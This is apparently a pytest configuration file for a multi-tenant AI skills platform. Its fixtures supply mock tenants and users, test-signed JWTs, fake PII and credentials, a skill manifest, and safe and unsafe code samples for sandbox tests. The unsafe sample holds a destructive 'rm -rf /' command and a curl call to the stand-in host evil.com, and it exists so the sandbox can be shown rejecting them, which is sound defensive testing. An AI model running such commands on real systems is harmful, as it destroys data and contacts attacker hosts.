"""
AI Empire Test Suite — Pytest configuration and shared fixtures.
"""
import asyncio
import os
import sys
import tempfile
import pytest
import pytest_asyncio
from pathlib import Path
from typing import AsyncGenerator, Generator

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))


@pytest.fixture(scope="session")
def event_loop() -> Generator[asyncio.AbstractEventLoop, None, None]:
    """Create event loop for the test session."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    yield loop
    loop.close()


@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """Create a temporary directory for the test."""
    with tempfile.TemporaryDirectory() as tmp:
        yield Path(tmp)


@pytest.fixture
def mock_tenant() -> dict:
    """Mock tenant for testing."""
    return {
        "id": "00000000-0000-0000-0000-000000000001",
        "name": "Test Tenant",
        "slug": "test",
        "tier": "free",
        "max_skills": 10,
        "max_tools": 100,
        "max_files": 100,
        "max_file_size": 10737418240,
        "api_calls_per_minute": 100,
    }


@pytest.fixture
def mock_user(mock_tenant) -> dict:
    """Mock user for testing."""
    return {
        "id": "00000000-0000-0000-0000-000000000002",
        "tenant_id": mock_tenant["id"],
        "email": "test@example.com",
        "password_hash": "$2b$12$abcdefghijklmnopqrstuv",
        "role": "user",
        "is_active": True,
    }


@pytest.fixture
def admin_user(mock_tenant) -> dict:
    """Mock admin user."""
    return {
        "id": "00000000-0000-0000-0000-000000000003",
        "tenant_id": mock_tenant["id"],
        "email": "admin@example.com",
        "password_hash": "$2b$12$abcdefghijklmnopqrstuv",
        "role": "admin",
        "is_active": True,
    }


@pytest.fixture
def valid_jwt_token() -> str:
    """Pre-generated valid JWT for tests."""
    import jwt
    import time
    payload = {
        "sub": "00000000-0000-0000-0000-000000000002",
        "tenant_id": "00000000-0000-0000-0000-000000000001",
        "role": "user",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
    }
    return jwt.encode(payload, "test-secret-key-32-bytes-long-ok!", algorithm="HS256")


@pytest.fixture
def admin_jwt_token() -> str:
    """Pre-generated admin JWT."""
    import jwt
    import time
    payload = {
        "sub": "00000000-0000-0000-0000-000000000003",
        "tenant_id": "00000000-0000-0000-0000-000000000001",
        "role": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
    }
    return jwt.encode(payload, "test-secret-key-32-bytes-long-ok!", algorithm="HS256")


@pytest.fixture
def pii_test_text() -> str:
    """Text with various PII patterns for testing."""
    return """
    João da Silva, CPF 123.456.789-09, RG 12.345.678-9,
    mora na Rua das Flores 123, São Paulo - SP, CEP 01310-100.
    Email: joao@example.com, telefone (11) 98765-4321.
    Cartão: 4111 1111 1111 1111, validade 12/2030, CVV 123.
    CNPJ da empresa: 12.345.678/0001-90.
    IP: 192.168.1.1
    Bearer token: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test
    OpenAI key: sk-1234567890abcdefghijklmnopqrstuvwxyz
    """


@pytest.fixture
def skill_manifest() -> dict:
    """Sample skill manifest."""
    return {
        "name": "test-skill",
        "version": "1.0.0",
        "description": "Test skill for unit tests",
        "capabilities": ["test", "demo"],
        "required_mcps": [],
        "sandbox_profile": "standard",
        "network_policy": {"allowed": ["*"]},
        "self_test": {
            "command": "echo ok",
            "timeout": 5,
        },
        "tools": [
            {
                "name": "test_tool",
                "description": "A test tool",
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "x": {"type": "integer"},
                    },
                    "required": ["x"],
                },
            }
        ],
    }


@pytest.fixture
def safe_python_code() -> str:
    """Safe Python code for sandbox tests."""
    return """
def main(x: int) -> dict:
    return {"doubled": x * 2, "squared": x ** 2}
"""


@pytest.fixture
def unsafe_python_code() -> str:
    """Unsafe Python code that should be REJECTED by sandbox."""
    return """
import os
import subprocess
os.system("rm -rf /")
subprocess.call(["curl", "evil.com"])
"""


@pytest.fixture
def file_system() -> str:
    """A simple text file for upload tests."""
    return "Lorem ipsum dolor sit amet, consectetur adipiscing elit. " * 100
